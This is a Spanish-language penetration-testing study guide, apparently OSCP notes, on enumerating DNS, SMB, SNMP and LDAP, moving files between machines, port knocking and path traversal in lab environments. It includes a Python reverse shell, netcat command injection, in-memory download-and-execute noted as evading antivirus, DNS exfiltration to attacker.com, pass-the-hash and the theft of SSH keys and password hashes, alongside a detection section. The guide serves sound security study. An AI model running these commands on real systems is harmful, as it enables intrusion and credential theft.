---
title: "Enumeración de Redes y Servicios - Guía Completa"
date: Mon Dec 09 2025 00:00:00 GMT+0100 (Central European Standard Time)
categories: [Apuntes, Enumeración]
tags: [enumeracion, smb, dns, snmp, ldap, transferencia-archivos, port-knocking, oscp, apuntes, pentesting]
image: /assets/img/cabeceras/2025-12-09-enumeracion-redes.png
---

# Enumeración de Redes y Servicios - Guía Completa

## 🌐 DNS - Puerto 53

### ¿Qué es DNS?

El **Domain Name System (DNS)** traduce nombres de dominio a direcciones IP. Es crítico enumerarlo porque puede revelar:
- Subdominios ocultos
- Direcciones IP internas
- Información de infraestructura
- Topología de red

### Enumeración Básica con nslookup

```bash
# Iniciar nslookup en modo interactivo
nslookup

# Establecer servidor DNS objetivo
> server 10.129.227.211
Default server: 10.129.227.211
Address: 10.129.227.211#53

# Consulta inversa (PTR record)
> 10.129.227.211
211.227.129.10.in-addr.arpa	name = ns1.cronos.htb.

# Salir
> exit
```

### Enumeración con dig

```bash
# Consultar registros NS (Name Servers)
dig @10.129.227.211 cronos.htb ns

# Consultar registros MX (Mail Exchange)
dig @10.129.227.211 cronos.htb mx

# Consultar registros A (IPv4)
dig @10.129.227.211 cronos.htb a

# Consultar registros AAAA (IPv6)
dig @10.129.227.211 cronos.htb aaaa

# Consultar TODOS los registros
dig @10.129.227.211 cronos.htb any
```

### Zone Transfer Attack (AXFR)

**¿Qué es?** Un Zone Transfer es una operación donde un servidor DNS transfiere su base de datos completa a otro servidor. Si está mal configurado, permite a atacantes obtener información completa.

```bash
# Intentar transferencia de zona
dig @10.129.227.211 cronos.htb axfr

# Con host
host -l cronos.htb 10.10.10.50

# Ejemplo de salida exitosa:
# cronos.htb.           604800  IN      SOA     cronos.htb. admin.cronos.htb.
# cronos.htb.           604800  IN      NS      ns1.cronos.htb.
# cronos.htb.           604800  IN      A       10.10.10.13
# admin.cronos.htb.     604800  IN      A       10.10.10.13
# ns1.cronos.htb.       604800  IN      A       10.10.10.13
# www.cronos.htb.       604800  IN      A       10.10.10.13
```

**🎯 MITRE ATT&CK**: T1590.002 - Gather Victim Network Information: DNS

### Enumeración de Subdominios

```bash
# Fuerza bruta de subdominios con dnsrecon
dnsrecon -d cronos.htb -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Con dnsenum
dnsenum --threads 50 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt cronos.htb

# Con gobuster
gobuster dns -d cronos.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50

# Con ffuf (virtual host discovery)
ffuf -u http://cronos.htb -H "Host: FUZZ.cronos.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 1234
```

**💡 Tips**:
- Siempre agregar dominios encontrados a `/etc/hosts`
- Usar múltiples wordlists (SecLists tiene excelentes opciones)
- Probar tanto HTTP como HTTPS

---

## 🔐 SMB - Puertos 139/445

### ¿Qué es SMB?

**Server Message Block (SMB)** es un protocolo para compartir archivos, impresoras y puertos serie en redes Windows. Es un vector de ataque crítico porque:
- Expone información del sistema
- Puede contener credenciales
- Vulnerable a ataques de relay
- Permite movimiento lateral

### Enumeración Básica

#### SMBMap (Tool moderna recomendada)

```bash
# Null session (sin autenticación)
smbmap -H 10.10.10.50

# Con credenciales
smbmap -H 10.10.10.200 -u 'user' -p 'password'

# Listar contenido de un share específico
smbmap -H 10.10.10.200 -u 'user' -p 'password' -r 'share_name'

# Recursivo en carpetas
smbmap -H 10.10.10.200 -u 'user' -p 'password' -r 'share_name/user'

# Descargar archivo
smbmap -H 10.10.10.200 -u 'user' -p 'password' --download 'share_name/folder/file.txt'

# Con hash NTLM (Pass-the-Hash)
smbmap -u itwk04admin -p aad3b435b51404eeaad3b435b51404ee:445414c16b5689513d4ad8234391aacf -H 192.168.227.226 -x 'powershell -command "type C:/Users/itwk04admin/Desktop/flag.txt"'
```

#### SMBClient (Cliente interactivo)

```bash
# Listar shares disponibles (sin autenticación)
smbclient -N -L //10.10.10.50

# Con autenticación
smbclient --no-pass -L //172.16.110.100

# Conectar a un share específico
smbclient -N //10.10.10.50/Documents

# Con credenciales
smbclient //dominio.com/shared -U usuario%password

# Comandos útiles dentro de smbclient:
smb: \> ls              # Listar archivos
smb: \> cd carpeta      # Cambiar directorio
smb: \> get archivo     # Descargar archivo
smb: \> put archivo     # Subir archivo
smb: \> mget *          # Descargar múltiples archivos
smb: \> prompt OFF      # Desactivar prompts
smb: \> recurse ON      # Habilitar recursión
smb: \> mget *          # Descargar recursivamente
```

**Descargar todo recursivamente**:
```bash
# Sintaxis completa
smbclient '\\server\share' -N -c 'prompt OFF;recurse ON;cd path\to\directory\;lcd ~/path/to/download/;mget *'

# Ejemplo práctico
smbclient '\\10.10.10.50\Public' -U usuario%password -c 'prompt OFF;recurse ON;lcd /tmp/loot;mget *'
```

#### Enum4Linux (All-in-one tool)

```bash
# Enumeración completa
enum4linux 10.10.10.50

# Solo usuarios
enum4linux -U 10.10.10.50

# Solo shares
enum4linux -S 10.10.10.50

# Solo políticas
enum4linux -P 10.10.10.50

# Agresivo (todo)
enum4linux -a 10.10.10.50
```

### Scripts de Nmap para SMB

```bash
# Detectar versión y seguridad
nmap --script=smb2-security-mode.nse -p445 10.10.10.5

# Escanear múltiples IPs
nmap --script=smb2-security-mode.nse -iL SMB_IPs.txt -p445

# Buscar vulnerabilidades conocidas
nmap -p 445 10.10.10.50 --script=smb-vuln* -o nmap_smb.txt

# Enumerar shares
nmap --script=smb-enum-shares.nse -p445 10.10.10.50
```

**Vulnerabilidades SMB críticas**:
- **MS17-010 (EternalBlue)**: RCE en SMBv1
- **MS08-067**: RCE crítico en Windows XP/2003
- **SMB Signing Disabled**: Permite NTLM Relay

### CrackMapExec (CME) - Herramienta Moderna

```bash
# Enumerar sin autenticación
crackmapexec smb 10.10.10.200 -u 'guest' -p ''

# Con credenciales
crackmapexec smb 10.10.10.200 -u 'user' -p 'password'

# Enumerar contenido de shares (spider)
crackmapexec smb 10.10.10.200 -u 'usuario' -p 'password' --spider sharedfolder --regex .

# Enumerar usuarios por RID bruteforce
crackmapexec smb 10.129.204.177 -u '' -p '' --rid-brute 10000

# Enumerar usuarios autenticado
crackmapexec smb 10.129.227.255 -u user -p 'password' -d dominio.com --users

# Descargar archivos
crackmapexec smb 172.16.236.82 -u yoshi -p 'Mushroom!' -d medtech.com --get-file \\Users\\yoshi\\passwords.txt ./passwords.txt

# Obtener SAM (requiere admin)
crackmapexec smb 192.168.1.100 -u 'admin' -p 'password' --sam

# Obtener NTDS.dit (Domain Controller)
crackmapexec smb 192.168.1.100 -u 'admin' -p 'password' --ntds vss

# Habilitar RDP remotamente
crackmapexec smb 10.9.20.13 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:7574cbf9d92c39d1d4dccd7b89301d2f' -x 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'
```

**🔥 Tip**: CrackMapExec es extremadamente potente para enumeración de Active Directory.

### Acceso gráfico a SMB

```bash
# Desde terminal Linux
thunar smb://10.10.10.50

# Desde Nautilus
nautilus smb://10.10.10.50/share

# Montar share localmente
sudo mount -t cifs //10.10.10.50/share /mnt/smb -o username=user,password=pass
```

### Compartir archivos con impacket-smbserver

```bash
# Compartir carpeta actual (sin autenticación)
sudo impacket-smbserver smbFolder $(pwd) -smb2support

# Con autenticación (más seguro)
sudo impacket-smbserver smbFolder $(pwd) -username andy -password Andy12345 -smb2support

# En máquina Windows, conectar con:
# net use z: \\10.10.14.87\smbFolder /user:andy Andy12345
# copy file.txt z:\
```

**⚠️ Advertencia OpSec**: impacket-smbserver es muy ruidoso y fácil de detectar. Solo para entornos de laboratorio.

---

## 📡 SNMP - Puerto 161/UDP

### ¿Qué es SNMP?

**Simple Network Management Protocol (SNMP)** se usa para monitorear y administrar dispositivos de red. Es valioso porque puede revelar:
- Información de hardware y software
- Procesos en ejecución
- Usuarios del sistema
- Configuraciones de red

### Enumeración SNMP

#### SNMPWalk

```bash
# Community string por defecto "public"
snmpwalk -c public -v1 -t 10 192.168.245.156

# Versión 2c (más común)
snmpwalk -v 2c -c public 10.129.211.32

# Buscar cadenas específicas (ejemplo: passwords)
snmpbulkwalk -c public -v2c 192.168.245.156 . | grep -i passwd
```

**Community strings comunes**:
- public (lectura)
- private (lectura/escritura)
- manager
- admin

#### SNMP-Check

```bash
# Enumeración completa automática
snmp-check 10.129.211.32 -p 161 -c public
```

#### ONESIXTYone (Fuzzer de community strings)

```bash
# Fuerza bruta de community strings
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.10.10.50
```

### OIDs Útiles

```bash
# Información del sistema
snmpwalk -v2c -c public 10.10.10.50 1.3.6.1.2.1.1.1.0

# Procesos en ejecución
snmpwalk -v2c -c public 10.10.10.50 1.3.6.1.2.1.25.4.2.1.2

# Usuarios del sistema
snmpwalk -v2c -c public 10.10.10.50 1.3.6.1.4.1.77.1.2.25

# Puertos TCP abiertos
snmpwalk -v2c -c public 10.10.10.50 1.3.6.1.2.1.6.13.1.3

# Software instalado
snmpwalk -v2c -c public 10.10.10.50 1.3.6.1.2.1.25.6.3.1.2

# Cuentas de usuario
snmpwalk -v 1 -c public 10.129.211.32 NET-SNMP-EXTEND-MIB::nsExtendOutputFull
```

**🎯 MITRE ATT&CK**: T1602.002 - Data from Configuration Repository: Network Device Configuration Dump

### Nmap SNMP Scripts

```bash
# Enumeración básica
nmap -sU -p161 --script=snmp-info 10.10.10.50

# Brute force de community strings
nmap -sU -p161 --script=snmp-brute 10.10.10.50

# Información de procesos
nmap -sU -p161 --script=snmp-processes 10.10.10.50

# Interfaces de red
nmap -sU -p161 --script=snmp-interfaces 10.10.10.50
```

---

## 🔎 LDAP - Puertos 389/636

### ¿Qué es LDAP?

**Lightweight Directory Access Protocol (LDAP)** es el protocolo para acceder a Active Directory. Es crítico porque puede revelar:
- Usuarios y grupos del dominio
- Estructura organizacional
- Políticas de contraseñas
- Información de equipos

### Enumeración sin Autenticación

```bash
# Búsqueda básica con ldapsearch
ldapsearch -x -H ldap://10.129.117.116 -b "DC=cascade,DC=local"

# Puerto no estándar
ldapsearch -x -H ldap://10.129.117.116 -p 389 -b "DC=cascade,DC=local"

# Especificar base DN automáticamente
ldapsearch -x -H ldap://10.10.10.50 -s base namingcontexts
```

### Enumeración Autenticada

```bash
# Con credenciales
ldapsearch -x -H ldap://10.10.10.200 -D "usuario@dominio.local" -w "password" -b "DC=dominio,DC=local"

# Buscar todos los usuarios
ldapsearch -x -H ldap://10.10.10.200 -D "usuario@dominio.local" -w "password" -b "DC=dominio,DC=local" "(objectClass=user)"

# Buscar grupos
ldapsearch -x -H ldap://10.10.10.200 -D "usuario@dominio.local" -w "password" -b "DC=dominio,DC=local" "(objectClass=group)"

# Buscar contraseñas LAPS
ldapsearch -x -H ldap://10.10.11.158 -b "DC=dominio,DC=local" -D usuario@dominio.local -w "password" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```

### LDAPDomainDump (Genera reportes HTML)

```bash
# Dump completo con autenticación
ldapdomaindump -u 'dominio.local\user' -p 'password' 10.10.10.200

# Con LDAPS (puerto 636, cifrado)
ldapdomaindump -u 'dominio.local\user' -p 'password' ldaps://10.10.10.200

# Resultado: Genera archivos HTML con información detallada
# - domain_computers.html
# - domain_groups.html
# - domain_users.html
# - domain_policy.html
# - domain_trusts.html
```

### Windapsearch (Especializado en AD)

```bash
# Enumerar usuarios sin autenticación
python ./windapsearch.py -d htb.local --dc-ip 10.129.95.210 -U

# Enumerar grupos
python ./windapsearch.py -d htb.local --dc-ip 10.129.95.210 -G

# Enumerar computadoras
python ./windapsearch.py -d htb.local --dc-ip 10.129.95.210 --computers

# Con autenticación
python ./windapsearch.py -d htb.local --dc-ip 10.129.95.210 -u usuario -p password -U
```

**💡 Tips**:
- Siempre intentar primero sin autenticación (null bind)
- Ldapdomaindump genera reportes HTML excelentes para análisis
- Guardar toda la salida de ldapsearch (puede ser muy extensa)

---

## 📤 Transferencia de Archivos

### Linux → Windows

#### Método 1: Certutil (CMD)

```bash
# Desde Windows CMD
certutil.exe -f -urlcache -split http://10.10.16.14/exploit.exe exploit.exe

# Flags:
# -f: Forzar sobrescritura
# -urlcache: Usar caché de URL
# -split: Dividir si es necesario
```

**💡 Ventaja**: Presente en casi todas las versiones de Windows.

#### Método 2: PowerShell

```powershell
# Invoke-WebRequest (PowerShell 3.0+)
IWR -URI http://10.10.10.50/nc.exe -OutFile C:\Windows\Temp\nc.exe

# Forma larga
Invoke-WebRequest http://10.10.10.50/nc.exe -OutFile C:\Windows\Temp\nc.exe

# Wget alias
powershell wget 10.10.14.7/nc.exe -o nc.exe

# Descargar y ejecutar directamente (sin tocar disco)
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.33/SharpHound.ps1')
```

**⚠️ Evasión de AV**: IEX (Invoke-Expression) ejecuta en memoria, evitando detección basada en archivos.

#### Método 3: BitsTransfer (Más sigiloso)

```powershell
# Usar BITS (Background Intelligent Transfer Service)
Import-Module BitsTransfer
Start-BitsTransfer -Source http://10.10.10.50/file.exe -Destination C:\Temp\file.exe

# O en una línea
powershell -c "Import-Module BitsTransfer; Start-BitsTransfer -Source http://10.10.10.50/file.exe -Destination C:\Temp\file.exe"
```

**🎯 MITRE ATT&CK**: T1105 - Ingress Tool Transfer

### Windows → Linux

#### Método 1: SCP (requiere SSH)

```powershell
# Desde Windows con OpenSSH
scp ruta\archivo.exe usuario@10.10.14.87:/tmp/

# Desde Linux hacia Windows
scp /tmp/file.txt usuario@192.168.1.100:C:\Temp\
```

#### Método 2: SMB con impacket-smbserver

```bash
# En Kali
sudo impacket-smbserver smbFolder $(pwd) -username andy -password Andy12345 -smb2support

# En Windows
net use z: \\10.10.14.87\smbFolder /user:andy Andy12345
copy C:\sensitive\file.txt z:\
net use z: /delete
```

#### Método 3: smbclient (Linux → Windows SMB)

```bash
# Descargar archivo de Windows
smbclient '//192.168.223.194/Desktop' -c 'lcd .; get archivo.txt' -U user%pass

# Con smbget
smbget smb://192.168.1.100/share/file.txt -U "john@example.com%myPassword"
```

### Linux → Linux

#### Método 1: NetCat

```bash
# Máquina receptora (Kali)
nc -nlvp 1234 > archivo.zip

# Máquina emisora (target)
nc -w 3 10.10.14.87 1234 < archivo.zip

# Alternativa con /dev/tcp (si nc no está disponible)
cat < archivo.zip > /dev/tcp/10.10.14.87/1234
```

#### Método 2: Python HTTP Server

```bash
# En máquina con el archivo
python3 -m http.server 8000

# O especificando directorio
python3 -m http.server 80 -d ~/tools

# En máquina receptora
wget http://10.10.10.50:8000/archivo
curl -O http://10.10.10.50:8000/archivo
```

#### Método 3: FTP (pyftpdlib)

```bash
# Levantar servidor FTP anónimo con permisos de escritura
sudo python -m pyftpdlib -p 69 -w

# Desde target
ftp 10.10.14.87 69
put archivo.txt
```

#### Método 4: SCP

```bash
# Descargar desde target a local
scp user@10.10.10.50:/home/user/archivo.txt /tmp/

# Subir desde local a target
scp /tmp/exploit.sh user@10.10.10.50:/tmp/
```

### Exfiltración de Datos

#### Método 1: Base64 encode para copiar/pegar

```bash
# En target
base64 -w0 archivo.zip

# Copiar output y en local
echo "BASE64STRING" | base64 -d > archivo.zip
```

#### Método 2: Usando DNS (exfiltración sigilosa)

```bash
# Dividir archivo y enviar por DNS queries
xxd -p archivo.txt | while read line; do dig $line.attacker.com; done
```

#### Método 3: ICMP tunneling

```bash
# Con herramientas como ptunnel o icmpsh
# Útil cuando solo ICMP está permitido
```

---

## 🚪 Port Knocking

### ¿Qué es Port Knocking?

Técnica de seguridad donde puertos están cerrados hasta que se envía una "secuencia secreta" de conexiones a puertos específicos.

### Ejemplo de configuración knockd.conf

```bash
[options]
 logfile = /var/log/knockd.log
 interface = ens160

[openSSH]
 sequence = 571, 290, 911
 seq_timeout = 5
 start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn

[closeSSH]
 sequence = 911,290,571
 seq_timeout = 5
 start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn
```

### Realizar Port Knocking

#### Con knock (herramienta dedicada)

```bash
# Instalar knock
sudo apt install knockd

# Ejecutar secuencia
knock 10.129.229.157 571:tcp 290:tcp 911:tcp

# O en formato corto
knock 10.129.229.157 571 290 911
```

#### Con Nmap

```bash
# Método manual
for x in 571 290 911; do nmap -Pn --max-retries 0 -p $x 10.10.10.50; done
```

#### Con NetCat

```bash
# Secuencia TCP
for port in 571 290 911; do nc -zv 10.10.10.50 $port; done
```

### Descubrir Port Knocking

```bash
# Analizar archivo de configuración con Path Traversal
curl -sk --path-as-is "https://192.168.228.245/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/knockd.conf"

# Buscar en archivos locales si tenemos acceso
cat /etc/knockd.conf
cat /etc/default/knockd
```

---

## 🔗 Técnicas de Conectividad

### Prueba de Conectividad con NetCat

```bash
# Probar si un puerto acepta conexiones
nc -nv 192.168.1.100 445

# Enviar comando simple
echo "HEAD / HTTP/1.0\r\n\r\n" | nc 192.168.1.100 80

# Banner grabbing
nc -nv 192.168.1.100 22
```

### Enviar Reverse Shell a través de GET

```bash
# En máquina víctima (via RCE web)
; whoami | nc 10.10.14.87 1234

# URL encoded
';whoami|nc+10.10.14.87+1234'

# En Kali
nc -nlvp 1234
```

### Enviar script Python vía NetCat

```bash
# Crear reverse shell python
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.87",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])' > shell.py

# Servir con NetCat
nc -nlvp 9001 < shell.py

# En víctima (si tiene Python y nc)
; nc 10.10.14.87 9001 | python

# Listener final
nc -nlvp 4444
```

### Bypass de Filtros de Caracteres

```bash
# Si '/' está bloqueado, usar variable de entorno
; cat+${HOME}etc${HOME}hosts

# El HOME (/) se expande a '/'
; cat+/etc/hosts

# Listar variables
; env | nc 10.10.14.87 1234
```

### TCPDUMP para Verificar Conectividad

```bash
# Escuchar ICMP en tun0
sudo tcpdump -ni tun0 icmp

# Desde target, hacer ping
ping -c 1 10.10.14.87

# Útil para:
# - Verificar conectividad desde target
# - Probar inyecciones SQL con xp_cmdshell
# - Confirmar RCE ciego
```

---

## 🔍 Path Traversal en Servidores Apache/Linux

### Técnica de Encoding de Path

```bash
# Leer archivos con path traversal
curl -sk --path-as-is "https://192.168.228.245/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# Claves SSH privadas
curl -sk --path-as-is "https://192.168.228.245/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/usuario/.ssh/id_rsa"

# Variantes de claves SSH
curl -sk --path-as-is "https://192.168.228.245/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/usuario/.ssh/id_ecdsa"
curl -sk --path-as-is "https://192.168.228.245/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/usuario/.ssh/id_dsa"
```

### Rutas Interesantes

```bash
# Sistema
/etc/passwd
/etc/shadow (si tenemos permisos)
/etc/os-release
/etc/issue
/etc/hostname

# Configuraciones
/etc/knockd.conf
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/root/.bash_history
/home/user/.bash_history

# Procesos y red
/proc/net/tcp
/proc/net/fib_trie
/proc/sched_debug
/proc/self/environ
```

---

## 📊 Herramientas de Auditoría

### Enum4Linux-ng (Versión mejorada)

```bash
# Instalación
git clone https://github.com/cddmp/enum4linux-ng
cd enum4linux-ng
pip3 install -r requirements.txt

# Uso
python3 enum4linux-ng.py 10.10.10.50 -A
```

### Impacket Suite (Imprescindible)

```bash
# Lookupsid (Enumerar SIDs)
impacket-lookupsid dominio.com/usuario:'password'@dominio.com

# Filtrar para crear lista de usuarios
impacket-lookupsid dominio.com/usuario:'password'@dominio.com | grep SidTypeUser | cut -d' ' -f 2 | cut -d'\' -f 2 | tee users.txt
```

---

## 🛡️ Contramedidas y Detección

### Detección de Enumeración SMB

**Indicadores**:
- Múltiples intentos de autenticación fallidos
- Enumeración de shares en corto tiempo
- Acceso a shares administrativos (ADMIN$, C$, IPC$)
- Consultas RPC excesivas

**Logs a monitorear**:
```powershell
# Event IDs importantes en Windows
4624 - Inicio de sesión exitoso
4625 - Inicio de sesión fallido
5140 - Share de red accedido
5142 - Share de red modificado
```

### Detección de SNMP Enumeration

**Indicadores**:
- Múltiples solicitudes SNMP GetNextRequest
- Consultas a OIDs sensibles
- Brute force de community strings

**Contramedidas**:
- Cambiar community strings por defecto
- Usar SNMPv3 con autenticación
- Filtrar SNMP solo a IPs autorizadas
- Deshabilitar SNMP si no se usa

### Detección de LDAP Enumeration

**Indicadores**:
- Consultas LDAP anónimas (null bind)
- Consultas masivas de objectClass=user
- Extracción completa del directorio

**Contramedidas**:
- Deshabilitar LDAP anónimo
- Implementar rate limiting
- Usar LDAPS (puerto 636) con certificados
- Monitorear Event ID 2889 (ldap over SSL)

---

## 🎓 Tips para OSCP

### Checklist de Enumeración

- [ ] Escanear todos los puertos TCP
- [ ] Escanear top 100 puertos UDP
- [ ] Enumerar cada servicio encontrado
- [ ] Buscar versiones vulnerables (searchsploit)
- [ ] Probar credenciales por defecto
- [ ] Buscar información en Google sobre servicios
- [ ] Documentar TODO (screenshots, comandos, resultados)

### Comandos Rápidos

```bash
# Escaneo completo en una línea
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.10.x -oG allPorts && \
PORTS=$(grep -oP '\d+/open' allPorts | cut -d'/' -f1 | tr '\n' ',' | sed 's/,$//') && \
sudo nmap -sCV -A -p$PORTS 10.10.10.x -oA targeted

# SMB Enumeration rápida
enum4linux -a 10.10.10.x | tee enum4linux.txt

# Web fuzzing rápido
gobuster dir -u http://10.10.10.x -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,txt,html
```

---

## 📚 Referencias

### Herramientas
- [Impacket](https://github.com/fortra/impacket)
- [Enum4Linux](https://github.com/CiscoCXSecurity/enum4linux)
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
- [LDAPDomainDump](https://github.com/dirkjanm/ldapdomaindump)

### Documentación
- [SMB Protocol - Microsoft](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb/f210069c-7086-4dc2-885e-861d837df688)
- [LDAP - RFC 4511](https://www.rfc-editor.org/rfc/rfc4511)
- [SNMP - RFC 3411](https://www.rfc-editor.org/rfc/rfc3411)

### Wordlists
- [SecLists](https://github.com/danielmiessler/SecLists)
- [FuzzDB](https://github.com/fuzzdb-project/fuzzdb)

---

**Última actualización**: 2025-01-10
**Autor**: A. Lorente
**Licencia**: Creative Commons BY-NC-SA 4.0
